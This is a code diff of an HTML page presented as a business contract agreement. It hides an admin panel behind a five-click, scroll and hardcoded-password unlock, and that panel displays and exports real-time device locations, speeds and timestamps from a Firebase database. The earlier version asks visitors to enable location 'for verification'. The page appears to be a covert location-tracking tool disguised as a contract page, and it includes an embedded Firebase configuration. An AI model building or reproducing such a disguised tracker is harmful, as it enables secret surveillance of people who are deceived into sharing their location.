@@ -1,92 +1,61 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
+  <title>Global Partnership Solutions</title>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Contract Agreement</title>
   <style>
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      margin: 0;
-      padding: 0;
-      background: #f4f4f4;
-      color: #333;
-    }
-    header {
-      background: #262626;
-      color: white;
-      padding: 1em;
-      text-align: center;
-    }
-    .contract-section {
-      padding: 2em;
-      max-width: 700px;
-      margin: auto;
-      background: white;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    footer {
-      text-align: center;
-      padding: 1em;
-      font-size: 0.9em;
-      color: #777;
-    }
-    .hidden {
-      display: none;
-    }
-    #adminPanel {
-      padding: 1em;
-    }
-    .input-password {
-      margin: 1em 0;
-    }
-    button {
-      padding: 0.6em 1.2em;
-      font-size: 1em;
-      margin-top: 0.5em;
-    }
-    .dark {
-      background: #111;
-      color: #ddd;
-    }
-    table {
-      width: 100%;
-      border-collapse: collapse;
-    }
-    th, td {
-      border: 1px solid #ccc;
-      padding: 6px;
-      text-align: left;
-    }
+    body { margin: 0; font-family: Arial, sans-serif; background: #f2f2f2; }
+    header { background: #003366; color: #fff; padding: 20px; text-align: center; }
+    section { padding: 40px 20px; }
+    .contract-box { max-width: 800px; margin: auto; background: white; padding: 30px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    .contract-title { font-size: 28px; font-weight: bold; color: #333; margin-bottom: 20px; }
+    .contract-text { font-size: 16px; color: #555; line-height: 1.6; }
+    .admin-panel { display: none; max-width: 1000px; margin: 30px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.2); }
+    .admin-title { font-size: 22px; font-weight: bold; margin-bottom: 10px; }
+    table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+    th, td { padding: 10px; border: 1px solid #ccc; font-size: 14px; }
+    th { background: #003366; color: white; }
+    input[type="text"] { padding: 8px; width: 100%; margin-bottom: 10px; }
+    #exportBtn { padding: 8px 16px; background: #006600; color: white; border: none; cursor: pointer; }
   </style>
 </head>
 <body>
-  <header><h1>Contract Agreement Portal</h1></header>
+  <header>
+    <h1>Global Partnership Solutions</h1>
+  </header>
 
-  <div class="contract-section" id="viewerPage">
-    <p>This platform is for digital contract signing and document review. Please enable your location for verification purposes.</p>
-    <p id="permissionPrompt" style="color: red;"></p>
+  <section>
+    <div class="contract-box" id="viewerPage">
+      <div class="contract-title">Business Agreement</div>
+      <div class="contract-text">
+        This document outlines a formal agreement for project development under Global Partnership Solutions. Ensure you agree with the outlined terms and responsibilities. Your consent is required to continue with the contractual engagement.
+      </div>
+    </div>
+  </section>
+
+  <div class="admin-panel" id="adminPanel">
+    <div class="admin-title">📍 Real-time Tracker Dashboard</div>
+    <input type="text" id="searchBox" placeholder="Search by ID..." />
+    <button id="exportBtn">Export CSV</button>
+    <table id="locationTable">
+      <thead>
+        <tr>
+          <th>ID</th>
+          <th>Lat</th>
+          <th>Lng</th>
+          <th>Speed</th>
+          <th>Timestamp</th>
+          <th>Map Link</th>
+        </tr>
+      </thead>
+      <tbody></tbody>
+    </table>
   </div>
 
-  <div id="adminPanel" class="hidden">
-    <h2>Admin Dashboard</h2>
-    <div class="input-password">
-      <input type="password" id="adminPass" placeholder="Enter Password" />
-      <button onclick="verifyPass()">Enter</button>
-    </div>
-    <div id="adminContent" class="hidden">
-      <button onclick="toggleTheme()">Toggle Theme</button>
-      <h3>Tracked Devices</h3>
-      <div id="dataList"></div>
-      <button onclick="exportCSV()">Export CSV</button>
-    </div>
-  </div>
-
-  <footer>&copy; 2025 Contract System</footer>
-
-  <!-- Firebase SDK -->
-  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
   <script>
     const firebaseConfig = {
       apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
@@ -97,70 +66,76 @@
       messagingSenderId: "810816177909",
       appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
     };
-
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // Tap counter for hidden admin panel
-    let tapCount = 0;
-    document.getElementById("viewerPage").addEventListener("click", () => {
-      tapCount++;
-      if (tapCount >= 5) {
-        document.getElementById("adminPanel").classList.remove("hidden");
-        window.scrollTo(0, document.body.scrollHeight);
+    function updateTable(data) {
+      const table = document.querySelector("#locationTable tbody");
+      table.innerHTML = "";
+      Object.entries(data).forEach(([id, loc]) => {
+        const row = document.createElement("tr");
+        row.innerHTML = `
+          <td>${id}</td>
+          <td>${loc.lat}</td>
+          <td>${loc.lng}</td>
+          <td>${loc.speed || 'N/A'}</td>
+          <td>${new Date(loc.timestamp).toLocaleString()}</td>
+          <td><a href="https://www.google.com/maps?q=${loc.lat},${loc.lng}" target="_blank">View</a></td>
+        `;
+        table.appendChild(row);
+      });
+    }
+
+    function filterTable() {
+      const filter = document.getElementById("searchBox").value.toLowerCase();
+      const rows = document.querySelectorAll("#locationTable tbody tr");
+      rows.forEach(row => {
+        const text = row.textContent.toLowerCase();
+        row.style.display = text.includes(filter) ? "" : "none";
+      });
+    }
+
+    document.getElementById("searchBox").addEventListener("input", filterTable);
+
+    db.ref("locations").on("value", (snap) => {
+      if (snap.exists()) {
+        updateTable(snap.val());
       }
     });
 
-    function verifyPass() {
-      const pass = document.getElementById("adminPass").value;
-      if (pass === "ASCII") {
-        document.getElementById("adminContent").classList.remove("hidden");
-        loadData();
-      } else {
-        alert("Incorrect password");
+    document.getElementById("exportBtn").addEventListener("click", () => {
+      const rows = document.querySelectorAll("#locationTable tr");
+      let csv = "";
+      rows.forEach(row => {
+        const cols = row.querySelectorAll("td, th");
+        const rowText = [...cols].map(col => `"${col.innerText}"`).join(",");
+        csv += rowText + "\n";
+      });
+      const blob = new Blob([csv], {type: "text/csv"});
+      const link = document.createElement("a");
+      link.href = URL.createObjectURL(blob);
+      link.download = "locations.csv";
+      link.click();
+    });
+
+    // Admin unlock: 5x tap then scroll to bottom then enter password
+    let tapCount = 0;
+    document.body.addEventListener("click", () => {
+      tapCount++;
+      if (tapCount >= 5) {
+        window.addEventListener("scroll", () => {
+          if ((window.innerHeight + window.scrollY) >= document.body.scrollHeight) {
+            const pass = prompt("Enter access password:");
+            if (pass === "ASCII") {
+              document.getElementById("adminPanel").style.display = "block";
+              document.getElementById("viewerPage").style.display = "none";
+            } else {
+              alert("Access denied");
+            }
+          }
+        }, { once: true });
       }
-    }
-
-    function toggleTheme() {
-      document.body.classList.toggle("dark");
-    }
-
-    function loadData() {
-      db.ref("location").on("value", (snapshot) => {
-        const data = snapshot.val();
-        let output = "<table><tr><th>Device</th><th>Latitude</th><th>Longitude</th><th>Speed</th><th>Direction</th><th>Time</th><th>Map</th></tr>";
-        for (const id in data) {
-          const item = data[id];
-          output += `<tr>
-            <td>${id}</td>
-            <td>${item.lat}</td>
-            <td>${item.lon}</td>
-            <td>${item.speed || "N/A"}</td>
-            <td>${item.direction || "N/A"}</td>
-            <td>${item.timestamp || "N/A"}</td>
-            <td><a href="https://maps.google.com/?q=${item.lat},${item.lon}" target="_blank">View</a></td>
-          </tr>`;
-        }
-        output += "</table>";
-        document.getElementById("dataList").innerHTML = output;
-      });
-    }
-
-    function exportCSV() {
-      db.ref("location").once("value", (snapshot) => {
-        const data = snapshot.val();
-        let csv = "Device,Latitude,Longitude,Speed,Direction,Timestamp\n";
-        for (const id in data) {
-          const d = data[id];
-          csv += `${id},${d.lat},${d.lon},${d.speed || ""},${d.direction || ""},${d.timestamp || ""}\n`;
-        }
-        const blob = new Blob([csv], { type: "text/csv" });
-        const a = document.createElement("a");
-        a.href = URL.createObjectURL(blob);
-        a.download = "locations.csv";
-        a.click();
-      });
-    }
+    });
   </script>
 </body>
-  </html>
+        </html>
